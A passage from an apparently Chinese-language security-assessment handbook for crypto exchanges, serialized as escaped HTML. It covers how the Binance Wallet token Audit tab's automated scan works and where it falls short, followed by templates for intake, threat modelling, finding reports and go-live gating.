Agreement<\/td>\n<td>与攻击者约定归还资金并给予赏金<\/td>\n<\/tr>\n<tr>\n<td>破玻璃<\/td>\n<td>Break-glass<\/td>\n<td>紧急情况下启用的特殊权限/密钥流程<\/td>\n<\/tr>\n<tr>\n<td>止血<\/td>\n<td>Containment<\/td>\n<td>先阻止损失扩大<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>8. 思考题<\/h2>\n<ol>\n<li>为什么&quot;暂停权限&quot;和&quot;升级权限&quot;要分离？分别由谁持有、有什么延迟更合适？<\/li>\n<li>你的监控在凌晨 3 点发出冷钱包异动告警，值班人员无法联系签名人。预案里缺了什么？<\/li>\n<li>选一起本手册中的事故，按第 3 节决策树模拟：如果你是值班人员，前 30 分钟的每一步是什么？<\/li>\n<\/ol>\n<p>下一章：回到 <a href=\"#home\" data-nav=\"home\">README<\/a> 复习学习路径，或用<a href=\"#t04\" data-nav=\"t04\">模板<\/a>开始一次真实评估。<\/p>\n"}, "a10": {"id": "a10", "file": "assessment/A10-case-binance-alpha-audit.md", "title": "A10 实例分析：币安钱包 / Alpha 代币的 Audit 页是怎么来的", "group": "asm", "html": "<h1>A10 实例分析：币安钱包 / Alpha 代币的 Audit 页是怎么来的<\/h1>\n<blockquote class=\"\"><p>学习目标：读完本章，你能——<\/p>\n<ol>\n<li>说清 Audit 页上每一条信息的<strong>来源链路<\/strong>，并区分&quot;官方已公开的&quot;和&quot;我们推断的&quot;。<\/li>\n<li>知道自动扫描能发现什么、发现不了什么，对照 <a href=\"#a05\" data-nav=\"a05\">A05<\/a> 的八条红线。<\/li>\n<li>在尽调中把这类扫描结果当作<strong>第 0 步分诊<\/strong>，而不是结论。<\/li>\n<\/ol>\n<p>前置章节：<a href=\"#a05\" data-nav=\"a05\">A05 上币与合作项目尽调<\/a>、<a href=\"#c06\" data-nav=\"c06\">06 外部调用与代币<\/a><br>交互工具：<a href=\"#lab-listing-scorecard\" data-nav=\"lab-listing-scorecard\" class=\"lab-link\">上币评分卡<\/a><\/p>\n<\/blockquote>\n<blockquote class=\"warn\"><p>⚠️ 本章的事实边界：下面标&quot;已公开&quot;的内容来自币安技能库文档、CertiK 官方博客和币安支持页；标&quot;推断&quot;的是根据这些材料作出的合理推断，<strong>币安没有公开完整的数据供应链<\/strong>，请自行核实后再引用。资料会随产品更新而变化，读到本章时请再确认。<\/p>\n<\/blockquote>\n<hr>\n<h2>1. 一句话理解<\/h2>\n<p><strong>Audit 页不是人工审计报告，而是一次自动化的合约扫描结果：把代币合约的代码和链上行为，对照一组风险规则，给出&quot;命中 / 未命中&quot;的清单。它是体检的血常规，不是 CT 全身检查。<\/strong><\/p>\n<blockquote class=\"analogy\"><p>🎯 打个比方：Audit 页像<strong>机场的安检门<\/strong>。<\/p>\n<ul>\n<li>它能快速发现金属物品（貔貅盘、过高税率、可增发这类典型特征）。<\/li>\n<li>它查不出藏在行李里的新型危险品（业务逻辑漏洞、尚未被规则收录的后门）。<\/li>\n<li>过了安检门，不等于这个乘客可信；没过，大概率值得多看一眼。<\/li>\n<\/ul>\n<p>比喻的局限：安检门每次检查都是即时的，而代币合约在你检查之后还能被项目方改（升级、改税、限制流动性），所以&quot;今天通过&quot;不等于&quot;明天通过&quot;。<\/p>\n<\/blockquote>\n<hr>\n<h2>2. Audit 页上看到的是什么<\/h2>\n<p>在币安钱包里点开一个代币，会有一个 <strong>Audit（审计）<\/strong> 标签。币安支持页的说法是：进入代币，点 Audit 标签查看被标记的风险，并称它是&quot;有用的第一道检查，但不是万无一失&quot;，需要配合自己的调查。<\/p>\n<p>结构（来自币安技能库中&quot;查询代币审计&quot;文档，已公开）：<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>层级<\/th>\n<th>内容<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>是否有结果<\/td>\n<td><code>hasResult<\/code>（有无审计数据）、<code>isSupported<\/code>（这个代币能不能被审计）。两者都为真，结果才有效<\/td>\n<\/tr>\n<tr>\n<td>总体等级<\/td>\n<td><code>riskLevelEnum<\/code>：LOW / MEDIUM / HIGH；对应数值等级 0–5<\/td>\n<\/tr>\n<tr>\n<td>附加信息<\/td>\n<td>买入税 <code>buyTax<\/code>、卖出税 <code>sellTax<\/code>、合约是否已验证 <code>isVerified<\/code><\/td>\n<\/tr>\n<tr>\n<td>风险分类<\/td>\n<td><code>CONTRACT_RISK<\/code>（合约风险）、<code>TRADE_RISK<\/code>（交易风险）、<code>SCAM_RISK<\/code>（骗局风险）<\/td>\n<\/tr>\n<tr>\n<td>每条细则<\/td>\n<td><code>title<\/code>、<code>description<\/code>、<code>isHit<\/code>（是否命中）、<code>riskType<\/code>：RISK（严重）或 CAUTION（警告）<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p>等级怎么读：<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>数值<\/th>\n<th>等级<\/th>\n<th>文档给出的指引<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>0–1<\/td>\n<td>LOW<\/td>\n<td>谨慎推进，自己做研究<\/td>\n<\/tr>\n<tr>\n<td>2–3<\/td>\n<td>MEDIUM<\/td>\n<td>仔细看每个命中项<\/td>\n<\/tr>\n<tr>\n<td>4<\/td>\n<td>HIGH<\/td>\n<td>避免交易<\/td>\n<\/tr>\n<tr>\n<td>5<\/td>\n<td>HIGH<\/td>\n<td>阻止交易<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p>税率口径：文档给出的建议是 <strong>&gt;10% 属严重，5–10% 为警告，&lt;5% 可接受<\/strong>。<\/p>\n<blockquote class=\"info\"><p>💡 注意：文档特别强调&quot;LOW 不等于安全&quot;，结果是时间点快照，项目方之后可以改合约或限制流动性。这与本章后面的结论一致。<\/p>\n<\/blockquote>\n<hr>\n<h2>3. 信息从哪里来：已公开与推断<\/h2>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart LR\n  subgraph PUB[&quot;链上与公开数据&quot;]\n    SRC[&quot;合约字节码与已验证源码&quot;]\n    TX[&quot;交易与持仓历史&quot;]\n    DEP[&quot;部署者历史地址&quot;]\n  end\n  SCAN[&quot;自动化扫描引擎&lt;br/&gt;(规则 + 模拟交易)&quot;]\n  API[&quot;币安钱包安全接口&lt;br/&gt;/security/token/audit&quot;]\n  UI[&quot;钱包 Audit 标签页&lt;br/&gt;绿勾 / 红标 + 说明&quot;]\n  SRC --&gt; SCAN\n  TX --&gt; SCAN\n  DEP --&gt; SCAN\n  SCAN --&gt; API --&gt; UI\n  CK[&quot;CertiK Skynet Token Scan&lt;br/&gt;(2025-07 公告已接入)&quot;] -. &quot;已公开: 提供扫描能力&quot; .-&gt; SCAN<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul>\n<li><strong>已公开<\/strong>：2025 年 7 月，CertiK 发布公告称币安钱包集成了 CertiK 的 Skynet Token Scan，在代币页新增 Audit 标签，一键显示安全清单；未命中的风险项显示绿勾，可能有问题的显示红标，并附风险说明。CertiK 说明它&quot;持续检查数十个关键风险向量&quot;，并举了三类：恶意代码（增发、改余额、提高交易税）、中心化风险（隐藏权限可冻结资金或改变代币机制）、高风险钱包（部署者曾关联高风险或欺诈发币）。<\/li>\n<li><strong>已公开<\/strong>：币安技能库里的接口文档给出了上面第 2 节的字段结构。但文档<strong>没有写明数据供应商<\/strong>，也没有列出完整检查项，只点名了&quot;貔貅风险（能买不能卖）&quot;这一项。<\/li>\n<li><strong>推断<\/strong>：钱包 Audit 页的数据很可能由第三方扫描引擎提供，再由币安的接口包装。但 CertiK 公告只说明&quot;集成&quot;，没有说明所有链、所有代币（含 Alpha 代币）的结果是否都由它产生，<strong>也不能排除同时使用别的数据源<\/strong>。<\/li>\n<li><strong>别混淆<\/strong>：这里的 &quot;Audit&quot; 是<strong>扫描<\/strong>，不是 CertiK 之类公司出具的<strong>人工审计报告<\/strong>。两者的深度、范围和责任完全不同。<\/li>\n<li>局限：Alpha 本身是币安的早期项目发现和交易入口，与主站上币的审核流程不同；Audit 页是<strong>用户保护提示<\/strong>，不代表币安对该代币做了人工审计背书。<\/li>\n<\/ul>\n<hr>\n<h2>4. 它能发现什么，发现不了什么<\/h2>\n<p>对照 <a href=\"#a05\" data-nav=\"a05\">A05 的八条红线<\/a>：<\/p>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>A05 红线<\/th>\n<th>自动扫描通常能否发现<\/th>\n<th>说明<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>可无限增发且无时间锁<\/td>\n<td>通常能（增发函数 + 权限）<\/td>\n<td>但&quot;时间锁是否真实有效&quot;需人工看<\/td>\n<\/tr>\n<tr>\n<td>貔貅盘<\/td>\n<td>通常能（模拟买卖 + 税率 + 黑名单）<\/td>\n<td>文档明确列出的检查项<\/td>\n<\/tr>\n<tr>\n<td>owner 可冻结任意地址<\/td>\n<td>通常能（暂停/黑名单函数）<\/td>\n<td>CertiK 所述&quot;中心化风险&quot;属此类<\/td>\n<\/tr>\n<tr>\n<td>隐藏后门 / 升级后门<\/td>\n<td>部分能<\/td>\n<td>代理合约的实现可以后续替换，扫描只看当前版本<\/td>\n<\/tr>\n<tr>\n<td>升级权为单签 EOA<\/td>\n<td>部分能<\/td>\n<td>能读到 admin 地址类型；能否判断&quot;这个多签其实是一个人控制&quot;则不能<\/td>\n<\/tr>\n<tr>\n<td>锁仓 / 流动性锁是假的<\/td>\n<td>较弱<\/td>\n<td>需要核验锁仓合约与解锁条件<\/td>\n<\/tr>\n<tr>\n<td>地址与官网/审计不一致<\/td>\n<td>不能<\/td>\n<td>需要人工比对官方渠道<\/td>\n<\/tr>\n<tr>\n<td>字节码与已验证源码不一致<\/td>\n<td>部分能<\/td>\n<td><code>isVerified<\/code> 只说明&quot;有验证源码&quot;，不等于&quot;和审计的版本一致&quot;<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<p><strong>扫描的结构性盲区（任何自动扫描都有）：<\/strong><\/p>\n<ol>\n<li><strong>快照问题<\/strong>：只反映检查时刻。可升级合约、可改税率的合约，之后随时可变。<\/li>\n<li><strong>规则覆盖<\/strong>：只发现已知模式。新的后门写法、复杂的业务逻辑漏洞（如 <a href=\"#c10\" data-nav=\"c10\">10 章<\/a> 的经济攻击）不在其内。<\/li>\n<li><strong>上下文缺失<\/strong>：看不到项目方的运营安全（私钥管理、多签流程），而这是 <a href=\"#a06\" data-nav=\"a06\">A06<\/a> 里损失最大的来源。<\/li>\n<li><strong>没有结果的情形<\/strong>：<code>hasResult=false<\/code> 或 <code>isSupported=false<\/code> 时没有任何审计结论，不能当作&quot;没风险&quot;。<\/li>\n<\/ol>\n<hr>\n<h2>5. 评估人员怎么用它<\/h2>\n<p>把 Audit 页当作 <strong>第 0 步分诊<\/strong>，放在尽调流程的最前面：<\/p>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart TB\n  A[&quot;拿到上币 / 合作申请&quot;] --&gt; B[&quot;第 0 步: 扫描结果&lt;br/&gt;(Audit 页 / 同类扫描)&quot;]\n  B --&gt; C{&quot;命中严重项?&quot;}\n  C -- &quot;是&quot; --&gt; D[&quot;直接按红线处理&lt;br/&gt;并独立复现确认&quot;]\n  C -- &quot;否&quot; --&gt; E[&quot;不代表安全&lt;br/&gt;继续 A05 全流程&quot;]\n  B --&gt; F{&quot;无结果 / 不支持?&quot;}\n  F -- &quot;是&quot; --&gt; G[&quot;视为未评估&lt;br/&gt;必须人工评估&quot;]\n  D --&gt; H[&quot;评分卡&quot;]\n  E --&gt; H\n  G --&gt; H<\/pre><\/div>\n<p><strong>读图要点：<\/strong><\/p>\n<ul>\n<li>命中严重项 → 可以快速否决，但<strong>要独立复现<\/strong>（读源码、分叉环境模拟买卖），因为扫描也有误报。<\/li>\n<li>未命中 → 只是通过了&quot;最低门槛&quot;，仍要走完 <a href=\"#a05\" data-nav=\"a05\">A05<\/a> 的权限、链上数据、运营、经济四个维度。<\/li>\n<li>无结果 → 当作&quot;未评估&quot;，不能当作&quot;通过&quot;。<\/li>\n<li>局限：把扫描结果直接当上币依据，会把交易所的责任外包给一个你无法控制、也没看过规则的黑盒。<\/li>\n<\/ul>\n<h3>5.1 独立验证清单<\/h3>\n<p>对扫描给出的每一类结论，都用自己的方法再确认一遍：<\/p>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 在区块浏览器上确认合约已验证源码，并比对部署字节码。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 读取 owner / admin / minter 地址，判断是 EOA 还是多签，多签阈值与时间锁。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 查看代理实现槽，确认是否可升级、谁可升级。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 在分叉环境小额模拟买入再卖出，核对实际税率与扫描结果一致。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 查部署者地址的历史：是否曾部署过已被标记的合约。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 查持仓前 10 / 前 50 集中度与流动性锁定。<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 把扫描结果、查询时间和链上读数一并存入证据附录（扫描是快照，要记录时间）。<\/li>\n<\/ul>\n<hr>\n<h2>6. 从这个实例学到的评估原则<\/h2>\n<ol>\n<li><strong>看懂&quot;谁说的&quot;<\/strong>：每一条风险信息，都要能回答&quot;数据来自哪里、规则是什么、多久更新一次&quot;。回答不了，就只能当提示。<\/li>\n<li><strong>区分扫描与审计<\/strong>：自动扫描是广度覆盖，人工审计是深度覆盖。两者互补，不互相替代。<\/li>\n<li><strong>快照要带时间<\/strong>：任何自动结论在报告里都要写明检查时间；可升级合约要加上&quot;持续监控&quot;的上线条件。<\/li>\n<li><strong>没结果不是好结果<\/strong>：把&quot;未支持 / 无数据&quot;归入未评估。<\/li>\n<li><strong>自己的评分卡为准<\/strong>：外部扫描作为输入，结论由你按<a href=\"#lab-listing-scorecard\" data-nav=\"lab-listing-scorecard\" class=\"lab-link\">评分卡<\/a>得出并签字。<\/li>\n<\/ol>\n<hr>\n<h2>7. 术语表<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>术语<\/th>\n<th>英文<\/th>\n<th>定义<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>代币扫描<\/td>\n<td>Token Scan<\/td>\n<td>自动对代币合约做风险规则检查<\/td>\n<\/tr>\n<tr>\n<td>貔貅盘<\/td>\n<td>Honeypot<\/td>\n<td>能买不能卖的代币<\/td>\n<\/tr>\n<tr>\n<td>快照<\/td>\n<td>Snapshot<\/td>\n<td>某一时刻的检查结果，不保证之后仍成立<\/td>\n<\/tr>\n<tr>\n<td>误报 / 漏报<\/td>\n<td>False Positive / Negative<\/td>\n<td>扫描报告了不存在的风险 / 没报告存在的风险<\/td>\n<\/tr>\n<tr>\n<td>中心化风险<\/td>\n<td>Centralization Risk<\/td>\n<td>少数权限方可改变代币机制或冻结资金<\/td>\n<\/tr>\n<tr>\n<td>分诊<\/td>\n<td>Triage<\/td>\n<td>先快速分级，再决定投入多少评估资源<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<hr>\n<h2>8. 思考题<\/h2>\n<ol>\n<li>一个代币的 Audit 页显示 LOW、全部绿勾，但它是可升级代理，admin 是单签 EOA。按 <a href=\"#a05\" data-nav=\"a05\">A05<\/a>，你的结论是什么？Audit 页为什么没拦住？<\/li>\n<li>某代币显示&quot;不支持审计&quot;。你要在报告里怎么写？需要补哪些工作？<\/li>\n<li>为什么说&quot;扫描 ≠ 审计&quot;？用范围、深度、责任三个角度各举一点。<\/li>\n<li>你要向业务方解释&quot;为什么我们不能只看钱包里的 Audit 页就上币&quot;，用三句话说清楚。<\/li>\n<\/ol>\n<hr>\n<p>Sources（均为公开页面，内容可能随产品更新）：<\/p>\n<ul>\n<li><a href=\"https://www.certik.com/resources/blog/binance-wallet-integrates-certiks-skynet-token-scan\" target=\"_blank\" rel=\"noopener\">Binance Wallet Integrates CertiK&#39;s Skynet Token Scan（CertiK，2025-07-17）<\/a><\/li>\n<li><a href=\"https://github.com/binance/binance-skills-hub/blob/main/skills/binance-web3/query-token-audit/SKILL.md\" target=\"_blank\" rel=\"noopener\">query-token-audit（币安技能库 SKILL.md）<\/a><\/li>\n<li><a href=\"https://support.binance.us/en/articles/15426082-what-to-know-before-you-swap-tokens-in-binance-us-web3-wallet\" target=\"_blank\" rel=\"noopener\">What to know before you swap tokens in Binance.US Web3 Wallet<\/a><\/li>\n<\/ul>\n<p>下一章：回到 <a href=\"#home\" data-nav=\"home\">README<\/a> 复习评估篇学习路径。<\/p>\n"}, "t01": {"id": "t01", "file": "templates/T01-intake-checklist.md", "title": "T01 评估受理资料清单", "group": "tpl", "html": "<h1>T01 评估受理资料清单<\/h1>\n<blockquote class=\"\"><p>用途：每次评估开始前，让申请方（项目方、业务线、合作方）填写。缺项就是第一批发现。<br>配套：<a href=\"#a01\" data-nav=\"a01\">A01 评估方法论<\/a>、<a href=\"#a07\" data-nav=\"a07\">A07 外部审计<\/a><\/p>\n<\/blockquote>\n<h2>1. 基本信息<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>字段<\/th>\n<th>填写<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>项目 / 合约名称<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>评估类型<\/td>\n<td>A 交易所自有 / B DeFi 协议 / C 上币与合作尽调<\/td>\n<\/tr>\n<tr>\n<td>申请人 / 业务负责人<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>期望完成日期 / 上线日期<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>涉及资金量级（预估 TVL / 托管额）<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>目标链<\/td>\n<td>以太坊 / BNB / TRON / Mantle / 其他<\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h2>2. 代码与部署<\/h2>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 仓库地址与<strong>提交哈希<\/strong>（不是分支名）<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 范围内文件清单；范围外文件及理由<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 编译器版本、依赖及版本（OpenZeppelin 等）<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 已部署合约地址（如已部署）与源码验证状态<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 部署脚本与初始化参数<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 是否分叉自其他项目；改了什么<\/li>\n<\/ul>\n<h2>3. 文档与规格<\/h2>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 设计文档 / 白皮书 / 架构图<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 关键不变量（“什么必须永远成立”）<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 角色与权限表（谁能做什么）<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 外部依赖清单：预言机、被集成协议、代币、桥<\/li>\n<\/ul>\n<h2>4. 权限与运营<\/h2>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 所有特权地址：类型（EOA / 多签 / 时间锁）、阈值、持有人<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 升级机制与时间锁时长<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 暂停机制与持有人<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 密钥管理方式（硬件 / MPC / HSM）<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 前端托管、域名、依赖管理<\/li>\n<\/ul>\n<h2>5. 既有安全工作<\/h2>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 已有审计报告（版本、范围、发现与修复状态、已确认风险）<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 内部测试：覆盖率、模糊/不变量测试<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 漏洞赏金计划<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 已知问题与已接受风险<\/li>\n<\/ul>\n<h2>6. 受理结论<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>项<\/th>\n<th>结论<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>资料是否充分<\/td>\n<td>是 / 否（缺：）<\/td>\n<\/tr>\n<tr>\n<td>评估范围<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>评估深度<\/td>\n<td>完整审查 / 重点审查 / 快速尽调<\/td>\n<\/tr>\n<tr>\n<td>预计工时<\/td>\n<td><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n"}, "t02": {"id": "t02", "file": "templates/T02-threat-model.md", "title": "T02 威胁建模模板", "group": "tpl", "html": "<h1>T02 威胁建模模板<\/h1>\n<blockquote class=\"\"><p>用途：评估第 3 阶段使用。用一页纸回答“谁会攻击什么、怎么攻击、我们怎么防”。<br>配套：<a href=\"#a01\" data-nav=\"a01\">A01 评估方法论<\/a><\/p>\n<\/blockquote>\n<h2>1. 系统概览<\/h2>\n<ul>\n<li>一句话描述：<\/li>\n<li>数据/资金流图（可粘贴 mermaid）：<\/li>\n<\/ul>\n<div class=\"mmd-wrap\"><pre class=\"mmd\">flowchart LR\n  U[&quot;用户&quot;] --&gt; C[&quot;合约&quot;]\n  C --&gt; E[&quot;外部依赖&quot;]\n  A[&quot;管理员&quot;] --&gt; C<\/pre><\/div>\n<h2>2. 资产<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>资产<\/th>\n<th>位置<\/th>\n<th>价值估计<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>用户资金<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>协议金库<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>治理权 / 升级权<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>签名密钥<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h2>3. 角色与信任<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>角色<\/th>\n<th>能做什么<\/th>\n<th>信任假设<\/th>\n<th>若作恶 / 被攻破<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>普通用户<\/td>\n<td><\/td>\n<td>不可信<\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>管理员<\/td>\n<td><\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>预言机<\/td>\n<td><\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>外部协议<\/td>\n<td><\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h2>4. 攻击者画像<\/h2>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 外部攻击者（有闪电贷）<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 恶意用户 / 竞争对手<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 被攻破的管理员或签名人<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 恶意或失效的依赖<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 国家级长期渗透<\/li>\n<\/ul>\n<h2>5. 威胁清单（STRIDE 风格，可按需扩展）<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>#<\/th>\n<th>威胁<\/th>\n<th>入口<\/th>\n<th>影响<\/th>\n<th>现有缓解<\/th>\n<th>剩余风险<\/th>\n<th>对应章节<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>1<\/td>\n<td><\/td>\n<td><\/td>\n<td><\/td>\n<td><\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h2>6. 需要重点验证的不变量<\/h2>\n<ol>\n<li><\/li>\n<li><\/li>\n<\/ol>\n<h2>7. 评审结论<\/h2>\n<ul>\n<li>最高风险的三个威胁：<\/li>\n<li>评估计划调整：<\/li>\n<\/ul>\n"}, "t03": {"id": "t03", "file": "templates/T03-finding-report.md", "title": "T03 发现与评估报告模板", "group": "tpl", "html": "<h1>T03 发现与评估报告模板<\/h1>\n<blockquote class=\"\"><p>用途：单条发现的格式 + 整份报告的结构。严重度口径见 <a href=\"#a02\" data-nav=\"a02\">A02<\/a>，可用<a href=\"#lab-severity-calculator\" data-nav=\"lab-severity-calculator\" class=\"lab-link\">评级计算器<\/a>。<\/p>\n<\/blockquote>\n<h2>一、单条发现<\/h2>\n<div class=\"code-wrap\"><pre><code>ID:            F-01\n标题:          （一句话，说明问题而不是现象）\n严重度:        严重 / 高 / 中 / 低 / 信息\n可能性:        高 / 中 / 低        影响: 高 / 中 / 低\n位置:          文件:行号 / 合约地址\n类别:          重入 / 权限 / 算术 / 外部调用 / 预言机 / 签名 / 升级 / 经济 / 运营 / 其他\n\n描述:          发生了什么，被打破的假设是什么\n影响:          最坏情况下损失什么，谁受影响\n触发条件:      需要什么前提（权限、资金、时机）\n证据:          代码引用 / 链上读数 / 测试（不得包含可直接利用的攻击代码）\n建议:          具体修复建议\n状态:          未处理 / 已修复 / 已接受风险 / 无法复现\n验证方式:      已读代码 / 回归测试 / 不变量 / 分叉验证 / 未验证\n<\/code><\/pre><\/div>\n<h2>二、整份报告结构<\/h2>\n<ol>\n<li><strong>摘要<\/strong>：结论（可上线 / 附条件 / 暂缓 / 否决）、发现统计、三句话风险概述。<\/li>\n<li><strong>范围与版本<\/strong>：提交哈希、文件、链、评估日期、方法与工时。<\/li>\n<li><strong>架构与信任假设<\/strong>：角色、权限、依赖。<\/li>\n<li><strong>发现列表<\/strong>：按严重度排序，使用上方格式。<\/li>\n<li><strong>签名流程 / 运营安全评估<\/strong>（A 类必填）。<\/li>\n<li><strong>经济与依赖风险<\/strong>（B 类必填）。<\/li>\n<li><strong>已接受风险<\/strong>：每项需业务负责人签字。<\/li>\n<li><strong>范围外说明<\/strong>：未覆盖的部分，需其他团队跟进的项。<\/li>\n<li><strong>上线条件与监控需求<\/strong>。<\/li>\n<li><strong>附录<\/strong>：测试清单、地址、读数。<\/li>\n<\/ol>\n<blockquote class=\"\"><p>报告原则：结论先行；每条发现可复核；剩余风险写清楚；不写无法被证据支持的断言。<\/p>\n<\/blockquote>\n"}, "t04": {"id": "t04", "file": "templates/T04-go-live-gate.md", "title": "T04 上线门禁清单", "group": "tpl", "html": "<h1>T04 上线门禁清单<\/h1>\n<blockquote class=\"\"><p>用途：评估第 7 阶段使用。全部“必须”项通过，才给出“可上线”。<br>配套：<a href=\"#a01\" data-nav=\"a01\">A01<\/a>、<a href=\"#a09\" data-nav=\"a09\">A09 应急响应<\/a><\/p>\n<\/blockquote>\n<h2>1. 必须项（任一不通过 = 不可上线）<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>#<\/th>\n<th>项<\/th>\n<th>通过标准<\/th>\n<th>状态<\/th>\n<th>证据<\/th>\n<\/tr>\n<\/thead>\n<tbody><tr>\n<td>1<\/td>\n<td>严重 / 高危发现<\/td>\n<td>全部已修复并验证，或经业务负责人书面接受<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>2<\/td>\n<td>上线版本 = 评估版本<\/td>\n<td>提交哈希/字节码一致；改动已做差异审计<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>3<\/td>\n<td>部署与初始化<\/td>\n<td>原子化；参数已逐项核对；源码已验证<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>4<\/td>\n<td>权限<\/td>\n<td>特权地址均为多签 / 时间锁；无单签 EOA 控制升级<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>5<\/td>\n<td>升级时间锁<\/td>\n<td>满足约定时长；暂停与升级权限分离<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>6<\/td>\n<td>暂停能力<\/td>\n<td>已测试；持有人可 24 小时响应<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>7<\/td>\n<td>限额<\/td>\n<td>单笔 / 单位时间上限已配置<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>8<\/td>\n<td>监控与告警<\/td>\n<td>大额转出、权限变更、升级、价格异常，有人响应<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>9<\/td>\n<td>应急预案<\/td>\n<td>联系人清单、决策树、推演已做<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<tr>\n<td>10<\/td>\n<td>签名流程（A 类）<\/td>\n<td>独立解码、带外确认、终端隔离已验证<\/td>\n<td><\/td>\n<td><\/td>\n<\/tr>\n<\/tbody><\/table><\/div>\n<h2>2. 建议项<\/h2>\n<ul>\n<li><input disabled=\"\" type=\"checkbox\"> 外部审计已完成并复审<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 漏洞赏金已上线<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 上线初期限额逐步放开<\/li>\n<li><input disabled=\"\" type=\"checkbox\"> 前端 SRI、依赖锁定、域名保护<\/li>\n<\/ul>\n<h2>3. 门禁结论<\/h2>\n<div class=\"table-wrap\"><table>\n<thead>\n<tr>\n<th>结论<\/th>\n<th>可上线 / 附条件上线 / 暂缓 / 